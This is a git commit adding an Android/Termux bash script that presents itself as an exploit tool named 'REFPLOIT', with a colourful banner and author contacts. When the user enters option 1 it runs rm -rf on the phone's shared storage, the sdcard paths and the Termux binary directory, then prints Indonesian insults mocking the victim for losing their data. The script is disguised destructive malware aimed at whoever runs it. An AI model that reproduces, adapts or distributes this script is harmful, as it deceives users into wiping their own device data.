61fc45bb5212ca33c1dd72b762c490f8d4b487f4
Sk4ters38 <46445388+Sk4ters38@users.noreply.github.com>
2019-01-16 12:12:51 +0000

    Add files via upload

---
+++ Gans.sh
@@ -0,0 +1,40 @@
+#!/usr/xsystem/bash/bin
+#yang baca anak Tolol And Buriq:v, tq
+#Coded By Sk4ters tamvans
+
+
+toilet -f mono12 -F border REFPLOIT
+
+echo "\033[33;1m_________________________________________________"
+echo "\033[30;1m|_______________________________________________|"
+echo "\033[37;1m[•]-------------------------------------------[•]"
+echo "\033[31;1mauthor : " "\033[36;1mSk4ters Tamvans"
+echo "\033[31;1mdate  : " "\033[34;1m 16-1-2019"
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+echo "\033[31;1mfacebook : " "\033[35;1mKepo Kau Bgstt!:v"
+echo "\033[31;1mwhatsApp : " "\033[32;1m083870256076"
+echo "\033[37;1m[•]-------------------------------------------[•]"
+echo "\033[33;1m|_______________________________________________|"
+sleep 01
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[32;1m"
+ read -p "root@start_refploit:~#" ommo
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+then
+clear
+pkg update
+pkg upgrade
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /storage/sdcard
+rm -rf /storage/sdcard1
+rm -rf $PREFIX/bin
+figlet Hwhwhwhwhwhw MAMPOS BABI DATA-DATA
+HANDPHONE KALIAN KE RESET HAHAHAHAHAHAHAH Kontol
+echo Unchhhhh:* cup-cup kesian ea babi Jgn Nangis ea Kamvank..sabar ae |lolcat -a -d 150
+fi
